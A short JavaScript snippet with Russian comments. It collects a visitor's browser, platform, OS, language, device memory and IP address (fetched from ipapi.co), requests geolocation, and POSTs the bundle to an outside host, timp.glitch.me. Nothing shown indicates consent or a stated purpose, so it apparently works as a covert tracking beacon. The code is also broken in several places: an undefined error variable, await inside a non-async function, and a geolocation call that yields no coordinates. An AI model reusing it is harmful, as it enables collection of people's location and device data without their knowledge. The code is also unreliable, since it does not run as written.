function success(position) {
  const latitude  = position.coords.latitude;
  const longitude = position.coords.longitude;
  // Используйте данные широты и долготы
}

function error() {
  console.warn(`ERROR(${err.code}): ${err.message}`);
  // Вы можете также вывести сообщение в интерфейсе пользователя
  alert("Не удалось получить ваше местоположение. Пожалуйста, убедитесь, что у вас включена геолокация и вы предоставили доступ к ней.");
}

const options = {
  enableHighAccuracy: true,
  timeout: 5000,
  maximumAge: 0
};

function getSystemInfo() {
    const systemInfo = {
        browser: navigator.userAgentData,
        platform: navigator.platform,
        osinfo: navigator.oscpu,
        geo: navigator.geolocation.getCurrentPosition(success, error, options),
        language: navigator.language,
        deviceMemory: navigator.deviceMemory || 'Неизвестно'
    };

   try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        if (!ipResponse.ok) {
            throw new Error('Не удалось получить IP-адрес');
        }
        const ipData = await ipResponse.json();
        systemInfo.ip = ipData.ip;  // Добавление IP-адреса в объект systemInfo
    } catch (error) {
        console.error('Ошибка при получении IP-адреса:', error);
        systemInfo.ip = 'Неизвестно'; // или другое значение по умолчанию
    }
    
    return systemInfo;
}

async function uploadSystemInfo() {
    const info = getSystemInfo(); // Получаем информацию о системе
    console.log("Отправляемые данные:", info);
    console.log("JSON:", JSON.stringify(info));
    await fetch('http://timp.glitch.me/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(info) // Отправляем информацию о системе
    });
}

